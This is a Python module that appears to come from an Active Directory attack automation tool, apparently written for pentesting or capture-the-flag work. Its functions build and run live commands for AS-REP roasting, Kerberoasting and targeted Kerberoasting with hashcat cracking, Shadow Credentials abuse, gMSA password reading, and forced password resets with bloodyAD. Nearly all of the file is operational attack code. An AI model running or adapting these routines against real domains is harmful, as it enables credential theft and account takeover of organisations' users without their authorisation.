import os 
import config
import re

def asreproast(box, path):
    """
    list optional (Missing)
    """
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m ASREProast')
    cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --asreproast ASREProastables.txt"
    cmd2 = 'hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m ASREProast')

def krbroast(box, path):
    """
    """
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Kerberoast')
    cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --kerberoasting kerberoastables.txt"
    cmd2 = 'hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m Kerberoast')

def target_krbroast(box, path):
    """
    target optional
    """
    opt = ''
    target = ''
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Targeted Kerberoasting (time sync)')
    if box.target and box.target != box.username:
        opt = f' --request-user {box.target}'
        target = '-'+box.target
    cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p '{box.password}' -o targeted_kerberoasting{target}.txt"+opt
    cmd2 = f'hashcat -m 13100 targeted_kerberoasting{target}.txt /usr/share/wordlists/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    if os.path.exists(f'{path.ws_atk}/targeted_kerberoasting{target}.txt'):
        os.remove(f'{path.ws_atk}/targeted_kerberoasting{target}.txt')
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m Targeted Kerberoasting')

def shadow_creds(box, path):
    """
    target required
    """
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Shadow Credentials (time sync)')
    cmd = f"certipy-ad shadow -u {box.username}@{box.domain} -p '{box.password}' -target {box.fqdn} -account {box.target} auto"
    config.log_cmd(cmd)
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee shadow_creds-{box.target}.out')
    print('\033[92m[+]\033[0m Shadow Credentials')

def ReadGMSAPassword(box, path):
    print('\033[93m[*]\033[0m ReadGMSAPassword')
    cmd = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --gmsa"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    cmd_out = os.popen(cmd).read()
    print(cmd_out)
    match = re.search(r'Account:\s+(\S+)', cmd_out)
    if match:
        gmsa_name = match.group(1)
        with open(f'{path.ws_atk}/gmsa-{gmsa_name}.out', "w", encoding="utf-8") as f:
            f.write(cmd_out)
    print('\033[92m[+]\033[0m ReadGMSAPassword')

def ForceChangePassword(box):
    """
    target required
    """
    new_password = 'newPassword1!'
    print('\033[93m[*]\033[0m ForceChangePassword')
    print(f'\033[95m[!]\033[0m Target: {box.target} : {new_password}')
    cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p '{box.password}' set password {box.target} '{new_password}'"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m ForceChangePassword')